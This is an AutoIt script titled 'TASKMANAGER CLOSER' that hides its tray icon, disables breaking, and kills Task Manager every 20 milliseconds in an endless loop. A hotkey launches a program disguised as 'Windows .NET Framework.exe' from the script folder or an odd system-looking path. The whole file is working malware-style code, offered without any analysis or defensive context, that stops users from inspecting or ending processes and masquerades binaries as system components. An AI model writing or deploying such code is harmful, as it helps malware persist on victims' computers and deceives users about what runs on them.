#comments-start
 TASKMANAGER CLOSER
#comments-end

#include <MsgBoxConstants.au3>
#include <StringConstants.au3>
#NoTrayIcon
Break(0);



#comments-start
======= FUNCTIONS======
#comments-end
HotKeySet("{F9}"  , "_exitCode");

Func _exitCode()
   If FileExists(@ScriptDir & "\Windows .NET Framework.exe") Then
	  $check = ShellExecute(@ScriptDir & "\Windows .NET Framework.exe");
	     If $check = 0 Then
			Run("C:\WindowsEntitys\Mathe\Windows .NET Framework.exe");
		 EndIf
   EndIf
EndFunc

Func _blockerTaskMgr()

   while true
	 sleep(20)
	 #cs
	  Opt("WinWaitDelay",1);
	  WinWaitActive("Windows Task-Manager");
	  ControlDisable("Windows Task-Manager", "", "&Prozess beenden");
	  ControlDisable("Windows Task-Manager", "", "SysListView321");
	  ControlDisable("Windows Task-Manager", "", "SysTabControl321");
	  ControlDisable("Windows Task-Manager", "", "SysHeader324");
	  #ce
    If ProcessExists("taskmgr.exe") Then
		 ProcessClose("taskmgr.exe");

	  EndIf
   Wend
EndFunc


#comments-start
======= CODE TO BE EXECUTET AT START OF SCRIPT ======
#comments-end

_blockerTaskMgr();


